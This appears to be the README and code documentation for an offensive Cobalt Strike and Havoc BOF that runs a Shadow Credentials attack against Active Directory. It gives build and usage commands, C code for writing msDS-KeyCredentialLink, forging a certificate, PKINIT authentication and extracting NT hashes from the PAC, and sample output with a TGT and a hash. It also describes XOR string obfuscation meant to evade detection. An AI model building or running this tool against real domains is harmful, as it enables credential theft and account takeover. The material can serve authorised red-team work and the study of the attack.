# ShadowCredsBOF

Shadow Credentials attack BOF for Cobalt Strike and Havoc.

**Complete attack chain:**
1. **Shadow Credentials** - Write KeyCredential to msDS-KeyCredentialLink
2. **PKINIT** - Authenticate to KDC using certificate + DH
3. **UnPAC-the-hash** - Extract NT hash from PAC credentials

## Quick Start

```bash
# On Kali
git clone https://github.com/RayRRT/BOFs.git && cd BOFs/ShadowCreds-unPAC-BOF && make bof

# In Cobalt Strike
shadowcreds Administrator corp.local

# In Havoc
inline-execute shadowcreds.x64.o Administrator corp.local dc01.corp.local
```

## Output

```
[+] PFX (base64, no password):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUDCC...

[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqqAD...

[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4
```

## Files

```
ShadowCredsBOF/
├── README.md
├── Makefile
├── shadowcreds.cna           # Cobalt Strike aggressor script
├── build/
│   └── shadowcreds.x64.o     # Compiled BOF
├── src/
│   └── shadowcreds.c         # Complete implementation (single file)
└── include/
    └── beacon.h
```

---

# Code Documentation

## shadowcreds.c - Complete Implementation (Single File)

### Entry Point

```c
void go(char* args, int alen)
```

BOF entry. Parses arguments using Beacon API and calls `DoShadowCredentialsAttack()`.

**Arguments:**
| # | Name | Description | Example |
|---|------|-------------|---------|
| 1 | Target | sAMAccountName of target | `Administrator` or `DC01$` |
| 2 | Domain | Domain FQDN | `corp.local` |
| 3 | KDC | KDC hostname (optional) | `dc01.corp.local` |

### DoShadowCredentialsAttack

```c
static void DoShadowCredentialsAttack(char* szTarget, char* szDomain, char* szKdc)
```

Main orchestrator:
1. Calls `LookupUserDNAndSID()` → gets target DN and SID
2. Calls `GenerateCertificateAndKey()` → creates RSA keypair and certificate
3. Calls `BuildKeyCredentialBlob()` → constructs MS-ADTS KeyCredential
4. Calls `WriteKeyCredentialLink()` → writes to msDS-KeyCredentialLink via LDAP
5. Calls `DoPkinitAuth()` → PKINIT authentication
6. Calls `DeleteKeyCredentialLink()` → cleanup

---

## Phase 1: LDAP Operations

### LookupUserDNAndSID

```c
static BOOL LookupUserDNAndSID(const char* szTarget, const char* szDomain,
                               WCHAR* wszTargetDN, int dnLen,
                               BYTE** ppSid, DWORD* pdwSidLen)
```

LDAP query for target's DN and SID:

```c
// Build base DN from domain
// corp.local → DC=corp,DC=local
pLdap = ldap_initW(wszDomain, LDAP_PORT);
ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);

// Search by sAMAccountName
swprintf(wszFilter, L"(sAMAccountName=%s)", wszTarget);
ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);

pEntry = ldap_first_entry(pLdap, pResults);

// Get DN
dn = ldap_get_dnW(pLdap, pEntry);

// Get SID
ppValues = ldap_get_values_lenW(pLdap, pEntry, L"objectSid");
```

**Note:** Uses string obfuscation to avoid detection:
```c
GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);
// XOR 0x5A deobfuscation at runtime
```

### WriteKeyCredentialLink

```c
static BOOL WriteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN,
                                   BYTE* keyCredBlob, int blobLen)
```

Writes KeyCredential blob to msDS-KeyCredentialLink using DNWithBinary format:

```c
// Format: B:<hex_length>:<hex_blob>:<DN>
swprintf(wszValue, L"B:%d:", hexLen);
for (i = 0; i < blobLen; i++) {
    swprintf(wszValue + pos + i*2, L"%02X", keyCredBlob[i]);
}
wcscat(wszValue, L":");
wcscat(wszValue, wszTargetDN);

mod.mod_op = LDAP_MOD_ADD;
mod.mod_type = L"msDS-KeyCredentialLink";
mod.mod_vals.modv_strvals = strVals;

ldap_modify_sW(pLdap, wszTargetDN, mods);
```

### DeleteKeyCredentialLink

```c
static BOOL DeleteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN)
```

Removes the shadow credential after successful exploitation:

```c
mod.mod_op = LDAP_MOD_DELETE;
mod.mod_type = L"msDS-KeyCredentialLink";
mod.mod_vals.modv_strvals = strVals;  // Use saved value from write

ldap_modify_sW(pLdap, wszTargetDN, mods);
```

---

## Phase 2: Certificate & KeyCredential Generation

### GenerateCertificateAndKey

```c
static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain,
                                       const char* szSID, BYTE** ppPublicKey,
                                       int* pPublicKeyLen, BYTE** ppPfx,
                                       int* pPfxLen, GUID* pDeviceId)
```

Generates RSA keypair and self-signed certificate:

```c
// Generate container name
CoCreateGuid(pDeviceId);
swprintf(wszContainerName, L"ShadowCred_%08X%04X", pDeviceId->Data1, pDeviceId->Data2);

// Create crypto context
CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W,
                     PROV_RSA_FULL, CRYPT_NEWKEYSET);

// Generate 2048-bit RSA key
CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey);

// Export public key in BCRYPT format
publicKey = ExportRSAPublicKeyBCrypt(hKey, pPublicKeyLen);

// Build UPN
sprintf(szUPN, "%s@%s", szCN, szDomain);

// Generate certificate with UPN SAN
certData = BuildCertificateWithKey(hProv, hKey, szCN, szUPN, szSID, wszContainerName, &certLen, pPfxLen);
```

### ExportRSAPublicKeyBCrypt

```c
static BYTE* ExportRSAPublicKeyBCrypt(HCRYPTKEY hKey, int* outLen)
```

Converts CryptoAPI public key to BCRYPT_RSAKEY_BLOB format:

```c
// Export in PUBLICKEYBLOB format
CryptExportKey(hKey, 0, PUBLICKEYBLOB, 0, pubKeyBlob, &pubKeyBlobLen);

// PUBLICKEYBLOB format:
// BLOBHEADER (8 bytes) + RSAPUBKEY (12 bytes) + modulus (bitlen/8 bytes)
DWORD bitLen = *(DWORD*)(pubKeyBlob + 12);
DWORD modulusLen = bitLen / 8;
BYTE* modulus = pubKeyBlob + 20;

// Build BCRYPT_RSAKEY_BLOB
// Magic(4) + BitLength(4) + cbPublicExp(4) + cbModulus(4) + cbPrime1(4) + cbPrime2(4) + Exponent + Modulus
*(DWORD*)(bcryptBlob + 0) = BCRYPT_RSAPUBLIC_MAGIC;  // "RSA1"
*(DWORD*)(bcryptBlob + 4) = bitLen;
*(DWORD*)(bcryptBlob + 8) = 3;  // exponent length
*(DWORD*)(bcryptBlob + 12) = modulusLen;

// Exponent (big-endian): 65537 = 0x010001
bcryptBlob[24] = 0x01;
bcryptBlob[25] = 0x00;
bcryptBlob[26] = 0x01;

// Modulus - reverse from little-endian to big-endian
for (i = 0; i < modulusLen; i++) {
    bcryptBlob[27 + i] = modulus[modulusLen - 1 - i];
}
```

### BuildCertificateWithKey

```c
static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey,
                                     const char* szCN, const char* szUPN,
                                     const char* szSID, WCHAR* wszContainerName,
                                     int* certLen, int* pfxLen)
```

Builds self-signed certificate with UPN SAN and SID URL:

#### Step 1: Build Subject DN
```c
sprintf(szSubjectCN, "CN=%s", szCN);
CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, pbSubject, &cbSubject, NULL);
```

#### Step 2: Build SAN Extension with UPN
```c
// UPN entry (OID 1.3.6.1.4.1.311.20.2.3)
otherName.pszObjId = szOID_NT_PRINCIPAL_NAME;
otherName.Value.cbData = cbEncodedUPN;
otherName.Value.pbData = pbEncodedUPN;

altNameEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
altNameEntries[0].pOtherName = &otherName;
```

#### Step 3: Add SID URL (KB5014754 Strong Mapping)
```c
sprintf(szSidUrl, "tag:microsoft.com,2022-09-14:sid:%s", szSID);
altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
altNameEntries[1].pwszURL = wszSidUrl;
```

#### Step 4: Sign and Export PFX
```c
CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
                              X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
                              NULL, pbEncodedCert, &cbEncodedCert);

// Add to memory store with private key association
CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreCert);
CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &keyProvInfo);

// Export to PFX (no password)
PFXExportCertStoreEx(hMemStore, &pfxBlob, L"", NULL, EXPORT_PRIVATE_KEYS);
```

### BuildKeyCredentialBlob

```c
static BYTE* BuildKeyCredentialBlob(BYTE* publicKey, int publicKeyLen,
                                    GUID* deviceId, int* outLen)
```

Builds MS-ADTS KeyCredential blob (section 2.2.21):

```c
// Get current time
GetSystemTimeAsFileTime(&ft);

// Build entries
keyMaterialEntry = BuildKeyCredentialEntry(KCEI_KEYMATERIAL, publicKey, publicKeyLen, &kmLen);
keyUsageEntry = BuildKeyCredentialEntry(KCEI_KEYUSAGE, keyUsage, 1, &kuLen);      // NGC = 0x01
keySourceEntry = BuildKeyCredentialEntry(KCEI_KEYSOURCE, keySource, 1, &ksLen);   // AD = 0x00
deviceIdEntry = BuildKeyCredentialEntry(KCEI_DEVICEID, (BYTE*)deviceId, 16, &diLen);
customKeyInfoEntry = BuildKeyCredentialEntry(KCEI_CUSTOMKEYINFO, customKeyInfo, 2, &ckiLen);
lastLogonEntry = BuildKeyCredentialEntry(KCEI_KEYLASTLOGON, fileTimeBytes, 8, &llLen);
creationEntry = BuildKeyCredentialEntry(KCEI_KEYCREATION, fileTimeBytes, 8, &ctLen);

// Concatenate for hash
binaryProperties = keyMaterialEntry + keyUsageEntry + keySourceEntry + ...

// KeyID = SHA256(publicKey)
ComputeSha256(publicKey, publicKeyLen, keyId);

// KeyHash = SHA256(binaryProperties)
ComputeSha256(binaryProperties, bpLen, keyHash);

// Final blob: Version(4) + KeyID entry + KeyHash entry + binaryProperties
result[0-3] = 0x00020000;  // Version 0x200 (little-endian)
result[4...] = keyIdEntry + keyHashEntry + binaryProperties
```

**KeyCredential Entry Format:**
```
[Length (2 bytes, LE)][Type (1 byte)][Data]
```

**Entry Types:**
| Type | Value | Description |
|------|-------|-------------|
| KCEI_VERSION | 0x00 | Version |
| KCEI_KEYID | 0x01 | SHA256 of public key |
| KCEI_KEYHASH | 0x02 | SHA256 of properties |
| KCEI_KEYMATERIAL | 0x03 | BCRYPT_RSAKEY_BLOB |
| KCEI_KEYUSAGE | 0x04 | NGC (0x01) |
| KCEI_KEYSOURCE | 0x05 | AD (0x00) |
| KCEI_DEVICEID | 0x06 | Random GUID |
| KCEI_CUSTOMKEYINFO | 0x07 | Version/Flags |
| KCEI_KEYLASTLOGON | 0x08 | FILETIME |
| KCEI_KEYCREATION | 0x09 | FILETIME |

---

## Phase 3: PKINIT & UnPAC

### Constants

```c
#define ETYPE_AES256_CTS_HMAC_SHA1  18
#define ETYPE_AES128_CTS_HMAC_SHA1  17
#define ETYPE_RC4_HMAC              23

// Key usages (RFC 4120)
#define KRB_KEY_USAGE_AS_REP_ENCPART        3
#define KRB_KEY_USAGE_TGS_REQ_AUTH          7
#define KRB_KEY_USAGE_PAC_CREDENTIAL        16
```

### DH Parameters (RFC 2409 MODP Group 2)

```c
// 1024-bit prime
static const BYTE DH_P_MODP2[129] = {
    0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xC9, 0x0F, 0xDA, 0xA2, 0x21, 0x68, 0xC2, 0x34,
    // ...
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
};
static const BYTE DH_G_MODP2[] = { 0x02 };

static BYTE g_dhPrivateKey[128];    // Our private key
static BYTE g_dhPublicKey[128];     // Our public key
```

### BigInt Implementation

Minimal big integer for DH calculations:

```c
typedef struct {
    DWORD words[64];
    int len;
} BigInt;

static void bigint_modpow(BigInt* result, BigInt* base, BigInt* exp, BigInt* mod);
static void bigint_mul(BigInt* result, BigInt* a, BigInt* b);
static void bigint_sub(BigInt* result, BigInt* a, BigInt* b);
static void bigint_mod(BigInt* result, BigInt* a, BigInt* p);
```

### GenerateDHKeys

```c
static void GenerateDHKeys(HCRYPTPROV hProv)
```

```c
// Generate random private key
CryptGenRandom(hProv, 128, g_dhPrivateKey);
g_dhPrivateKey[0] &= 0x7F;  // Ensure positive

// Compute public key: g^privkey mod p
bigint_from_bytes(&p, DH_P_MODP2, sizeof(DH_P_MODP2));
bigint_from_bytes(&g, DH_G_MODP2, sizeof(DH_G_MODP2));
bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));
bigint_modpow(&y, &g, &x, &p);
bigint_to_bytes(&y, g_dhPublicKey, 128);
```

### BuildPkinitAsReq

```c
static BYTE* BuildPkinitAsReq(PCCERT_CONTEXT pCert, const char* user,
                              const char* domain, int* outLen)
```

Complete AS-REQ construction:

1. Build KDC-REQ-BODY
2. Hash body with SHA-1 (paChecksum)
3. Build AuthPack with DH key
4. Sign in CMS SignedData
5. Wrap in PA-PK-AS-REQ
6. Build AS-REQ

```
AS-REQ ::= [APPLICATION 10] SEQUENCE {
    pvno [1] INTEGER (5),
    msg-type [2] INTEGER (10),
    padata [3] SEQUENCE OF PA-DATA {
        PA-PK-AS-REQ (type 16)
    },
    req-body [4] KDC-REQ-BODY
}
```

### BuildKdcReqBody

```c
static BYTE* BuildKdcReqBody(const char* user, const char* realm, int* outLen)
```

```c
// kdc-options [0] - forwardable, renewable, canonicalize
kdcOptions = 0x40810010;

// cname [1] - client principal (NT-PRINCIPAL = 1)
cname = BuildPrincipalName(1, user, NULL);

// realm [2] - uppercase domain
realm = BuildGeneralString(realmUpper);

// sname [3] - krbtgt/REALM (NT-SRV-INST = 2)
sname = BuildPrincipalName(2, "krbtgt", realmUpper);

// till [5] - expiration (now + 1 year)
till = BuildGeneralizedTime("YYYYMMDDHHMMSSZ");

// nonce [7] - random 32-bit
nonce = random();

// etype [8] - preferred encryption types
etypes = { AES256, AES128, RC4 };
```

### BuildAuthPack

```c
static BYTE* BuildAuthPack(const char* user, const char* realm,
                           BYTE* reqBodyHash, int* outLen)
```

Builds RFC 4556 AuthPack:

```
AuthPack ::= SEQUENCE {
    pkAuthenticator [0] PKAuthenticator {
        cusec [0] INTEGER,
        ctime [1] KerberosTime,
        nonce [2] INTEGER,
        paChecksum [3] OCTET STRING  -- SHA-1 of KDC-REQ-BODY
    },
    clientPublicValue [1] SubjectPublicKeyInfo  -- DH public key
}
```

### BuildCmsSignedData

```c
static BYTE* BuildCmsSignedData(PCCERT_CONTEXT pCert, BYTE* content,
                                int contentLen, int* outLen)
```

Uses Windows CryptoMsg API with correct PKINIT OID:

```c
hMsg = CryptMsgOpenToEncode(
    PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
    0,
    CMSG_SIGNED,
    &signedInfo,
    "1.3.6.1.5.2.3.1",  // id-pkinit-authData OID
    NULL
);
```

**Critical:** The inner content OID must be `id-pkinit-authData`, not default `id-data`.

### SendToKdc

```c
static BYTE* SendToKdc(const char* kdcHost, int port, BYTE* data,
                       int dataLen, int* respLen)
```

TCP port 88 with length prefix:

```c
// 4-byte big-endian length
BYTE lenBuf[4];
lenBuf[0] = (requestLen >> 24) & 0xFF;
lenBuf[1] = (requestLen >> 16) & 0xFF;
lenBuf[2] = (requestLen >> 8) & 0xFF;
lenBuf[3] = requestLen & 0xFF;

send(sock, lenBuf, 4, 0);
send(sock, request, requestLen, 0);
```

### ProcessAsRep

```c
static void ProcessAsRep(BYTE* asRep, int asRepLen, PCCERT_CONTEXT pCert,
                         const char* user, const char* realm, const char* kdcHost)
```

#### Step 1: Check for KRB-ERROR
```c
if (asRep[0] == 0x7E) {
    // Parse error code and display
}
```

#### Step 2: Extract KDC's DH Public Key
```c
BYTE* kdcPubKey = ExtractKdcDhPublicKey(asRep, asRepLen, &kdcPubKeyLen);
```

#### Step 3: Compute Shared Secret
```c
// shared = KDC_pubkey^our_privkey mod p
bigint_from_bytes(&y, kdcPubKey, kdcPubKeyLen);
bigint_from_bytes(&x, g_dhPrivateKey, sizeof(g_dhPrivateKey));
bigint_modpow(&sharedSecret, &y, &x, &p);
```

#### Step 4: Derive Reply Key (kTruncate - RFC 4556)
```c
DeriveSessionKey(sharedSecretBytes, 128, serverNonce, serverNonceLen, replyKey, 32);
```

#### Step 5: Decrypt enc-part
```c
BYTE* decrypted = KerberosDecrypt(ETYPE_AES256_CTS_HMAC_SHA1,
                                  KRB_KEY_USAGE_AS_REP_ENCPART,
                                  replyKey, 32, encPart, encPartLen, &decryptedLen);
```

#### Step 6: Extract Session Key
```c
BYTE* sessionKey = ExtractSessionKey(decrypted, decryptedLen,
                                     &sessionKeyLen, &sessionKeyType);
```

#### Step 7: Output TGT (Kirbi)
```c
OutputKirbi(kirbiTgt, kirbiTgtLen, sessionKey, sessionKeyLen,
            sessionKeyType, user, realm);
```

#### Step 8: Extract NT Hash
- If PA-PAC-CREDENTIALS present → decrypt and parse
- Otherwise → perform U2U

### KerberosDecrypt / KerberosEncrypt

```c
static BYTE* KerberosDecrypt(int etype, int keyUsage, BYTE* key, int keyLen,
                             BYTE* cipher, int cipherLen, int* plainLen)
```

Uses `cryptdll.dll` internal functions:

```c
HMODULE hCryptDll = LoadLibraryA("cryptdll.dll");
pCDLocateCSystem = GetProcAddress(hCryptDll, "CDLocateCSystem");
pCDLocateCSystem(etype, &pCSystem);
pCSystem->Decrypt(keyUsage, key, keyLen, cipher, cipherLen, plain, plainLen);
```

Same technique as Mimikatz/Rubeus.

### OutputKirbi

```c
static void OutputKirbi(BYTE* ticket, int ticketLen, BYTE* sessionKey,
                        int sessionKeyLen, int encType, const char* user,
                        const char* realm)
```

Builds Rubeus-compatible KRB-CRED:

```
KRB-CRED ::= [APPLICATION 22] SEQUENCE {
    pvno [0] INTEGER (5),
    msg-type [1] INTEGER (22),
    tickets [2] SEQUENCE OF Ticket,
    enc-part [3] EncryptedData {
        etype 0,
        cipher: EncKrbCredPart {
            ticket-info [0] SEQUENCE OF KrbCredInfo {
                key [0] EncryptionKey,
                prealm [1] Realm,
                pname [2] PrincipalName,
                srealm [8] Realm,
                sname [9] PrincipalName (krbtgt/REALM)
            }
        }
    }
}
```

**Compatible with:**
- `Rubeus.exe ptt /ticket:<base64>`
- `Rubeus.exe describe /ticket:<base64>`
- Mimikatz `kerberos::ptt`

### PerformU2U

```c
static void PerformU2U(const char* kdcHost, const char* user, const char* realm,
                       BYTE* tgt, int tgtLen, BYTE* sessionKey, int sessionKeyLen,
                       BYTE* replyKey, int replyKeyLen)
```

User-to-User authentication when PA-PAC-CREDENTIALS not available:

1. Build TGS-REQ: user → user (self-referral)
2. Include TGT in additional-tickets
3. Set `enc-tkt-in-skey` flag
4. KDC encrypts with TGT session key
5. Decrypt ticket and extract PAC

### ParsePacCredentialData

```c
static void ParsePacCredentialData(BYTE* data, int dataLen)
```

Extracts NT hash from PAC_CREDENTIAL_DATA:

```
NTLM_SUPPLEMENTAL_CREDENTIAL {
    version,
    flags,
    ntHash[16]  ← Target
}
```

---

## Compilation

```bash
# Install mingw on Kali
sudo apt install mingw-w64

# Build BOFs
make bof

# Or manually
x86_64-w64-mingw32-gcc -c -DBOF -Os -s -fno-asynchronous-unwind-tables \
    -fno-ident -fpack-struct=8 -falign-functions=1 -w -mno-stack-arg-probe \
    -fno-stack-protector -Iinclude -o build/shadowcreds.x64.o src/shadowcreds.c
```

### Compiler Flags

```makefile
CFLAGS = -Os -s -fno-asynchronous-unwind-tables -fno-ident -fpack-struct=8
CFLAGS += -falign-functions=1 -w -mno-stack-arg-probe -fno-stack-protector
BOF_CFLAGS = -c -DBOF
```

| Flag | Purpose |
|------|---------|
| `-c` | Compile only, no link |
| `-Os` | Optimize for size |
| `-fno-stack-protector` | No stack canaries (BOF requirement) |
| `-fno-asynchronous-unwind-tables` | No .eh_frame |
| `-fpack-struct=8` | 8-byte struct alignment |
| `-mno-stack-arg-probe` | No stack probes (Windows compatibility) |

---

## Usage

### Cobalt Strike
1. Script Manager → Load → `shadowcreds.cna`

### Havoc
```
inline-execute /path/to/shadowcreds.x64.o <target> <domain> [kdc]
```

### Basic
```
shadowcreds Administrator corp.local
```

### Computer Account
```
shadowcreds DC01$ corp.local dc01.corp.local
```

### With Explicit KDC
```
shadowcreds Administrator corp.local dc01.corp.local
```

---

## Requirements

### Privileges
- Write access to target's `msDS-KeyCredentialLink` attribute (GenericWrite/GenericAll)

### Domain
- Domain Functional Level 2016+ (for PKINIT with certificates)
- PKINIT enabled (default)

---

## References

- [RFC 4556 - PKINIT](https://tools.ietf.org/html/rfc4556)
- [RFC 4120 - Kerberos V5](https://tools.ietf.org/html/rfc4120)
- [RFC 2409 - MODP Groups](https://tools.ietf.org/html/rfc2409)
- [MS-ADTS - KeyCredentialLink](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts)
- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [KB5014754](https://support.microsoft.com/en-us/topic/kb5014754)
- [Whisker/pyWhisker](https://github.com/eladshamir/Whisker)
- [Elad Samir, Shadow credentials](https://eladshamir.com/2021/06/21/Shadow-Credentials.html)
